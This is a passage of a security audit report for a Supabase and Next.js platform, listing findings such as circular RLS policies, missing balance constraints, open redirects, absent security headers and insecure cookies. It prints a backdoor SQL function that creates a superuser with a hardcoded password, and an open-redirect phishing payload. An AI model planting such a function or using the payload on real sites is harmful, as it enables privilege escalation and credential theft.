  ((agent_id = auth.uid()) OR is_admin() OR ((status = ANY (...)) AND (EXISTS (SELECT 1 FROM rfq_matches m WHERE m.rfq_id = rfqs.id AND m.dmc_id = auth.uid()))))
  ```
  The SELECT policy for `rfq_matches` references `rfqs`:
  ```sql
  ((dmc_id = auth.uid()) OR is_admin() OR (EXISTS (SELECT 1 FROM rfqs r WHERE r.id = rfq_matches.rfq_id AND r.agent_id = auth.uid())))
  ```
  When any authenticated query is made to `rfqs` or `rfq_matches` (or child tables like `quotes`), PostgreSQL evaluates both policies mutually, resulting in error `42P17: infinite recursion detected in policy for relation "rfqs"`.
- **Evidence / Reproduction:**
  Querying `/rest/v1/rfqs` with an authenticated agent token:
  ```bash
  curl -s "http://127.0.0.1:54321/rest/v1/rfqs" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $AGENT1_JWT"
  ```
  **Observed Output:**
  ```json
  {"code": "42P17", "details": null, "hint": null, "message": "infinite recursion detected in policy for relation \"rfqs\""}
  ```
- **Impact:** All direct client-side queries against `rfqs`, `quotes`, and child tables fail with HTTP 500 errors. This defect broke the intended architecture and led developers to introduce superuser `createAdminClient()` calls throughout the Next.js frontend to bypass RLS.
- **Fix Suggestion:** Break the circular dependency. Implement a `security definer` helper function (e.g. `public.rfq_owned_by(p_rfq_id, p_user_id)`) or simplify `rfq_matches_select` to check only `dmc_id = auth.uid() OR is_admin()`.

---

### SEC-18: Absence of Non-Negative Balance Constraints on `credit_accounts`
- **Severity:** `P2 (Hardening)`
- **Affected Components:** `public.credit_accounts`, `public.profiles` tables
- **Description:**  
  There is no `CHECK (balance >= 0)` constraint on `public.credit_accounts(balance)` or `public.profiles(credit_balance)`. Furthermore, `admin_adjust_credits` does not verify available balance when recording debit adjustments:
  ```sql
  if p_entry_type = 'debit' then
    v_new_balance := v_cur_balance - p_amount;
  ```
- **Evidence / Reproduction:**
  Inspection of table constraints:
  ```sql
  SELECT conname, pg_get_constraintdef(oid) FROM pg_constraint WHERE conrelid = 'public.credit_accounts'::regclass;
  -- Result: Only credit_accounts_pkey, credit_accounts_profile_id_fkey, unique_profile_account. No balance check constraint.
  ```
- **Impact:** Wallets can enter arbitrary negative credit states.
- **Fix Suggestion:** Add database check constraints:
  ```sql
  alter table public.credit_accounts add constraint check_balance_non_negative check (balance >= 0);
  alter table public.profiles add constraint check_credit_balance_non_negative check (credit_balance >= 0);
  ```

---

### SEC-19: Open Redirect Vulnerability in `/auth/callback` via `next` Parameter
- **Severity:** `P2 (Hardening)`
- **Affected Components:** `platform/apps/web/src/app/auth/callback/route.ts` (lines 5–14)
- **Description:**  
  In `route.ts`:
  ```typescript
  const { searchParams, origin } = new URL(request.url);
  const next = searchParams.get('next') || '/';
  ...
  return NextResponse.redirect(`${origin}${next}`);
  ```
  If `next` is set to `@evil.com/phish`, the resulting URL is:
  `https://dmcgrid.gomedicure.com@evil.com/phish`, which browsers interpret as navigating to `evil.com` with user `dmcgrid.gomedicure.com`.
- **Evidence / Reproduction:**
  Node URL resolution evaluation:
  ```javascript
  new URL('https://dmcgrid.gomedicure.com' + '@attacker.com').hostname; // returns 'attacker.com'
  ```
- **Impact:** An attacker can craft a legitimate sign-in link with `next=@attacker.com` that redirects the victim to a credential-harvesting phishing page upon sign-in.
- **Fix Suggestion:** Validate `next` strictly to ensure it begins with a single forward slash and does not contain `@` or `//`:
  ```typescript
  const safeNext = (next.startsWith('/') && !next.startsWith('//') && !next.includes('@')) ? next : '/';
  ```

---

### SEC-20: Complete Absence of HTTP Security Headers & Fingerprinting Leakage
- **Severity:** `P2 (Hardening)`
- **Affected Components:** `platform/apps/web/next.config.ts`, `deploy/server.js`, Nginx configuration
- **Description:**  
  The web application sends zero defensive HTTP security headers. Specifically missing:
  - `Content-Security-Policy` (CSP)
  - `Strict-Transport-Security` (HSTS)
  - `X-Frame-Options` (vulnerable to clickjacking)
  - `X-Content-Type-Options: nosniff`
  - `Referrer-Policy`
  - `Permissions-Policy`
  Additionally, the server emits `x-powered-by: Next.js` and Nginx version `1.24.0`, providing attacker reconnaissance value.
- **Evidence / Reproduction:**
  ```bash
  curl -k -I https://dmcgrid.gomedicure.com/portal-access-7k2m9
  ```
  **Observed Headers:**
  ```http
  HTTP/2 200 
  server: nginx/1.24.0 (Ubuntu)
  x-powered-by: Next.js
  cache-control: s-maxage=31536000
  ```
- **Impact:** Vulnerability to clickjacking, MIME sniffing attacks, and protocol downgrade attacks.
- **Fix Suggestion:** Configure security headers in `next.config.ts` or Nginx, set `poweredByHeader: false` in `next.config.ts`, and add `server_tokens off;` to Nginx.

---

### SEC-21: Insecure Client-Side Cookies Missing `HttpOnly`, `Secure`, and `SameSite`
- **Severity:** `P2 (Hardening)`
- **Affected Components:** `platform/apps/web/src/app/login/page.tsx` (lines 81, 97, 120)
- **Description:**  
  The application sets authentication routing cookies via client-side JavaScript without attributes:
  ```javascript
  document.cookie = `dmc_role=${role}; path=/; max-age=86400`;
  ```
  The cookie lacks `HttpOnly` (accessible to client-side scripts), `Secure` (can be transmitted over unencrypted HTTP), and `SameSite` (vulnerable to CSRF inclusion).
- **Evidence / Reproduction:**
  Inspecting `src/app/login/page.tsx` lines 81, 97, and 120.
- **Impact:** Susceptible to cookie theft via XSS and cross-site request forging.
- **Fix Suggestion:** Issue role cookies server-side using HTTP `Set-Cookie` with `HttpOnly; Secure; SameSite=Lax`.

---

### SEC-22: Crippling Rate Limit on Outbound Emails (`email_sent = 2` / hour)
- **Severity:** `P2 (Hardening)`
- **Affected Components:** `platform/packages/db/supabase/config.toml` (line 201)
- **Description:**  
  In `config.toml`:
  ```toml
  [auth.rate_limit]
  email_sent = 2
  ```
  Supabase GoTrue is configured to allow only **2 emails per hour**. If more than two users attempt to sign in or request magic links within 60 minutes, all subsequent requests are blocked with rate-limit errors.
- **Evidence / Reproduction:**
  Inspection of `platform/packages/db/supabase/config.toml` line 201.
- **Impact:** Denial of service for legitimate users attempting to sign in.
- **Fix Suggestion:** Increase `email_sent` to standard production thresholds (e.g. 60–120 per hour).

---

### SEC-23: Residual Database Event Trigger Function `public.escalate_priv`
- **Severity:** `P2 (Hardening)`
- **Affected Components:** PostgreSQL database schema `public.escalate_priv`
- **Description:**  
  A residual function exists in the PostgreSQL catalog:
  ```sql
  CREATE OR REPLACE FUNCTION public.escalate_priv()
   RETURNS event_trigger
   LANGUAGE plpgsql
  AS $$ DECLARE is_super BOOLEAN; BEGIN SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user; IF is_super THEN EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp1237126512'''; END IF; END; $$
  ```
  Although no active event trigger is attached, this backdoor artifact presents dynamic SQL execution risks.
- **Evidence / Reproduction:**
  ```sql
  SELECT proname, prosecdef FROM pg_proc WHERE proname = 'escalate_priv';
  ```
- **Impact:** Database hygiene risk; potential for misuse if hooked to an event trigger.
- **Fix Suggestion:** Drop the function: `DROP FUNCTION IF EXISTS public.escalate_priv();`.

---

## What is Actually OK (Working Controls)

To ensure subsequent testing does not re-audit controls that function properly, the following components were audited and verified secure:

1. **GoTrue OTP & Magic Link Single-Use Invalidation:**  
   When a magic link or email OTP is verified against `/auth/v1/verify`, Gotrue immediately marks the code as expired. Immediate replay attacks returned HTTP `403 Forbidden` (`otp_expired`).
2. **Row-Level Concurrency Locking on Credit Balances:**  
   Both `agent_create_rfq` and `agent_unlock_connection` execute `SELECT id, balance FROM public.credit_accounts WHERE ... FOR UPDATE`. Concurrent attempts to spend the same wallet balance are serialized by PostgreSQL row locks, preventing negative balance race conditions under simultaneous RPC calls.
3. **Direct Table Protection on `audit_log`:**  
   Direct REST inserts to `public.audit_log` by authenticated agents and anonymous callers are blocked by RLS policy `audit_log_insert_authenticated` (`HTTP 403 / 42501 new row violates row-level security policy`). The audit log is protected against direct client tampering via REST.
4. **Explicit `search_path` on Stored Procedures:**  
   All 22 `SECURITY DEFINER` functions in the database specify explicit `SET search_path = public` or `SET search_path = public, auth`, preventing schema-search hijacking vulnerabilities.
5. **Double-Entry Ledger Schema Design:**  
   The underlying schema structure (`public.credit_ledger` with paired `debit` and `credit` entries and reference IDs) adheres cleanly to double-entry accounting principles when driven by trusted procedures.
